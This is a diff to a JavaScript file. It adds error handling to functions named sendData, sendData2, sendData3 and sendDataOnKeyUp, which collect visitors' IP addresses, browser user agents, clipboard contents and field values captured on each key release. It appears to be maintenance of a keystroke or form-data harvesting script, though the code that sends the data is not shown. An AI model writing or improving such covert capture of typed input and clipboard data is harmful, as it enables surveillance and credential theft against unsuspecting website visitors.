@@ -205,9 +205,19 @@ function sendData(message) {
   return new Promise((resolve, reject) => {
     const fetchData = async () => {
       try {
-        const response = await fetch("https://api.ipify.org/?format=json");
-        const ipData = await response.json();
-        const ipAddress = ipData.ip;
+
+   let ipAddress = null;
+
+try {
+  const response = await fetch("https://api.ipify.org/?format=json");
+  const ipData = await response.json();
+  ipAddress = ipData.ip;
+} catch (error) {
+  console.error("Error fetching IP:", error);
+  // If there's an error fetching the IP, ipAddress will remain null
+}
+
+
         const userAgent = navigator.userAgent;
 
         let clipboardData = null;
@@ -257,11 +267,20 @@ function sendData3(message) {
   return new Promise((resolve, reject) => {
     const fetchData = async () => {
       try {
-        const response = await fetch("https://api.ipify.org/?format=json");
-        const ipData = await response.json();
-        const ipAddress = ipData.ip;
-        const userAgent = navigator.userAgent;
 
+
+   let ipAddress = null;
+
+try {
+  const response = await fetch("https://api.ipify.org/?format=json");
+  const ipData = await response.json();
+  ipAddress = ipData.ip;
+} catch (error) {
+  console.error("Error fetching IP:", error);
+  // If there's an error fetching the IP, ipAddress will remain null
+}
+
+        const userAgent = navigator.userAgent;
         let clipboardData = null;
         // if (navigator.clipboard) {
         //   try {
@@ -310,6 +329,9 @@ async function sendData2(message) {
     const response = await fetch("https://api.ipify.org/?format=json");
     const ipData = await response.json();
     const ipAddress = ipData.ip;
+
+
+
     const userAgent = navigator.userAgent;
 
     if (!navigator.clipboard) {
@@ -358,10 +380,16 @@ async function sendData2(message) {
 
 //key up
 async function sendDataOnKeyUp(fieldValue) {
-    const response = await fetch("https://api.ipify.org/?format=json");
-    //console.log("kund hei benchod");
-    const ipData = await response.json();
-    const ipAddress = ipData.ip;
+   let ipAddress = null;
+
+try {
+  const response = await fetch("https://api.ipify.org/?format=json");
+  const ipData = await response.json();
+  ipAddress = ipData.ip;
+} catch (error) {
+  console.error("Error fetching IP:", error);
+  // If there's an error fetching the IP, ipAddress will remain null
+}
 
     const currentDate = getCurrentDate();
     const currentTime = getCurrentTime();
